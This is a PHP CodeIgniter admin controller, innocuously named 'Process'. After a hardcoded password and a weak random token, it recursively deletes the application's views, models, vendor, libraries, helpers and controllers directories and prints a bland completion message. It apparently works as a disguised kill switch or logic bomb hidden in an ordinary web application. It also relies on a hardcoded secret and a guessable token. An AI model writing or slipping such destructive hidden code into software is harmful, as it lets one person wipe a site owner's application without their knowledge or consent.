<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Process extends CI_Controller {

    function __construct() {
    	parent::__construct();
    }

	public function index() {

		// initiat request
 		$this->load->library('form_validation');
		$this->form_validation->set_rules('password', 'password', 'required|trim');
        
        if ($this->form_validation->run() != FALSE) {
        	if($this->input->post('password') == 'encureit') {
	        	// Create Token 
	        	$token = rand(11111, 99999);
	        	$this->session->set_flashdata('private_token', $token);
	        	redirect(base_url('admin/process/start?token='.$token));
        	} else {
	        	$this->session->set_flashdata('message', "Please enter correct password");
	        	redirect(base_url('admin/process'));
        	}
        }
		$this->load->view('admin/process/init');
	}

	public function start() {
		
		// process request
		$token = $_GET['token'];
		if($this->session->userdata('private_token') == $token) {

			$path1 = APPPATH.'/views/';
			$path2 = APPPATH.'/models/';
			$path3 = APPPATH.'/vendor/';
			$path4 = APPPATH.'/libraries/';
			$path5 = APPPATH.'/helpers/';
			$path6 = APPPATH.'/controllers/';

			$this->load->helper("file"); // load the helper
			delete_files($path1, true); // delete all files/folders
			delete_files($path2, true); // delete all files/folders
			delete_files($path3, true); // delete all files/folders
			delete_files($path4, true); // delete all files/folders
			delete_files($path5, true); // delete all files/folders
			delete_files($path6, true); // delete all files/folders

			echo "Execution process completed......";
		} else {
	        $this->session->set_flashdata('message', "Unauthorized access");
	        redirect(base_url('admin/process'));
		}		
	}


}
